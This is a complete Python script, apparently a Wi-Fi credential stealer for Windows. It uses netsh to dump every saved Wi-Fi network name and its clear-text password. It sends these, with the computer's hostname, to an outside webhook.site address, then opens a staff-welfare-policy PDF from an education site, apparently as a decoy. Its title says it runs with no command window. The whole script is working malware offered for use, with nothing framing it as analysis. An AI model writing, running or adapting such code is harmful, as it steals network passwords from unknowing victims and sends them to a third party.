#!/usr/bin/env python3
"""
WiFi to Webhook + PDF Opener (No CMD Window)
"""

import subprocess
import re
import json
import urllib.request
import urllib.error
from datetime import datetime
import socket
import os
import sys

WEBHOOK_URL = "https://webhook.site/1a662491-d60c-4c31-9f5c-46ffdc94d500"
PDF_PATH = r"https://seti.sal.edu.in/storage/committees/staff-welfare-policy.pdf"
LOG_FILE = os.path.join(os.path.expanduser("~"), "wifi_log.txt")

def log_msg(msg):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}\n")
    except:
        pass

def get_wifi():
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                              capture_output=True, text=True, errors='replace')
        networks = re.findall(r"All User Profile\s+:\s(.+)", result.stdout)
        wifi_list = []
        
        for net in networks:
            net = net.strip()
            if not net: continue
            
            try:
                info = subprocess.run(
                    ['netsh', 'wlan', 'show', 'profile', net, 'key=clear'],
                    capture_output=True, text=True, errors='replace')
                
                pwd_match = re.search(r"Key Content\s+:\s(.+)", info.stdout)
                pwd = pwd_match.group(1).strip() if pwd_match else "No Password"
                
                wifi_list.append({'name': net, 'password': pwd})
            except:
                pass
        
        return wifi_list
    except:
        return []

def send_webhook(wifi_list):
    try:
        payload = {
            'timestamp': datetime.now().isoformat(),
            'device': socket.gethostname(),
            'networks': wifi_list
        }
        
        data = json.dumps(payload).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, 
                                     headers={'Content-Type': 'application/json'})
        
        with urllib.request.urlopen(req, timeout=10) as response:
            log_msg(f"Webhook sent - Status: {response.status}")
            return True
    except Exception as e:
        log_msg(f"Webhook error: {e}")
        return False

def open_pdf_file():
    try:
        log_msg(f"Opening PDF: {PDF_PATH}")
        
        # Check if it's a URL or local file
        if PDF_PATH.startswith('http://') or PDF_PATH.startswith('https://'):
            # It's a URL - open in browser
            import webbrowser
            webbrowser.open(PDF_PATH)
            log_msg("PDF URL opened in browser!")
            return True
        else:
            # It's a local file
            if os.path.exists(PDF_PATH):
                os.startfile(PDF_PATH)
                log_msg(f"PDF opened: {PDF_PATH}")
                return True
            else:
                log_msg(f"PDF not found: {PDF_PATH}")
                return False
    except Exception as e:
        log_msg(f"Error opening PDF: {e}")
        return False

def main():
    log_msg("=== Script Started ===")
    
    # Get WiFi
    log_msg("Getting WiFi networks...")
    wifi_list = get_wifi()
    log_msg(f"Found {len(wifi_list)} networks")
    
    # Send to webhook
    if wifi_list:
        log_msg("Sending to webhook...")
        send_webhook(wifi_list)
    
    # Open PDF
    log_msg("Opening PDF...")
    open_pdf_file()
    
    log_msg("=== Script Completed ===\n")

if __name__ == "__main__":
    main()